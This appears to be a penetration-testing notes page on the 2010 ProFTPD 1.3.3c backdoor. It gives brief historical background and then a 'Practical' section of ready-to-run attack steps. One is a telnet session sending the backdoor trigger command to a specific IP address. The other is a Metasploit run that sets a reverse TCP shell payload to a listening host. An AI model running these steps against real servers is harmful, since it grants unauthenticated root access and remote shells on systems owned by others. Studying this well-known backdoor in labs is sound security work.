# proftpd-1.3.3c-backdoor

## Theory

On Sunday, the 28th of November 2010 around 20:00 UTC the main distribution server of the ProFTPD project was compromised. The attackers most likely used an unpatched security issue in the FTP daemon to gain access to the server and used their privileges to replace the source files for ProFTPD 1.3.3c with a version which contained a backdoor. The unauthorized modification of the source code was noticed by Daniel Austin and relayed to the ProFTPD project by Jeroen Geilman on Wednesday, December 1 and fixed shortly afterwards.

Anyone who downloaded ProFTPD 1.3.3c from one of the official mirrors from 2010-11-28 to 2010-12-02 will most likely be affected by the problem. The backdoor introduced by the attackers allows unauthenticated users remote root access to systems which run the maliciously modified version of the ProFTPD daemon.



***

## Practical

### Telnet

```
telnet 163.172.229.5 21

HELP ACIDBITCHEZ

id;
```

### Metasploit

```
use exploit/unix/ftp/proftpd_133c_backdoor

set PAYLOAD generic/shell_reverse_tcp

set LHOST 192.168.100.18

set RHOST 192.168.100.20

exploit
```



***

## REFERENCES

* [https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor](https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor)
* [https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor\_Command\_Execution\_Automated\_Script](https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor\_Command\_Execution\_Automated\_Script)
* [https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd\_133c\_backdoor/](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd\_133c\_backdoor/)

